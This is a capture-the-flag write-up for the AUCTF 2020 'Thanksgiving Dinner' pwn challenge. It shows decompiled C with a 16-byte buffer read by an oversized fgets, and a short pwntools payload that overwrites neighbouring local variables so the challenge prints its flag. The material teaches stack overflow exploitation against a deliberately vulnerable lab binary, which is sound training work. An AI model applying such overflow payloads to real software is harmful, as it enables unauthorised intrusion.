## Thanksgiving Dinner

### Description
> I just ate a huge dinner. I can barley eat anymore... so please don't give me too much!
>
> `nc challenges.auctf.com 30011` 
>
> Note: ASLR is disabled for this challenge 
>
> Author: nadrojisk

### Attachment
[turkey](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/AUCTF2020/pwn/turkey/turkey)

### Analysis

```c
void vulnerable(void){
  char local_30 [16];
  int local_20;
  int local_1c;
  int local_18;
  int local_14;
  int local_10;
  
  puts("Hey I heard you are searching for flags! Well I\'ve got one. :)");
  puts("Here you can have part of it!");
  puts("auctf{");
  puts("\nSorry that\'s all I got!\n");
  local_10 = 0;
  local_14 = 10;
  local_18 = 0x14;
  local_1c = 0x14;
  local_20 = 2;
  fgets(local_30,0x24,stdin);
  if ((((local_10 == 0x1337) && (local_14 < -0x14)) && (local_1c != 0x14)) &&
     ((local_18 == 0x667463 && (local_20 == 0x2a)))) {
    print_flag();
  }
  return;
}
```

here is a buffer overflow obviously: 

```
fgets(local_30,0x24,stdin)
```

!> `local_30` is only 16 bytes

so, our input will **overwrite** to `local_20` ... `local_10` after 16 bytes of any char.

### Solution

```python
offset = 16
payload = cyclic(offset)
payload += p32(0x2a)       # local_20 == 0x2a
payload += p32(0xdeadbeef) # local_1c != 0x14
payload += p32(0x667463)   # local_18 == 0x667463
payload += p32(0xdeadbeef) # local_14 < -0x14
payload += p32(0x1337)     # local_10 == 0x1337
```

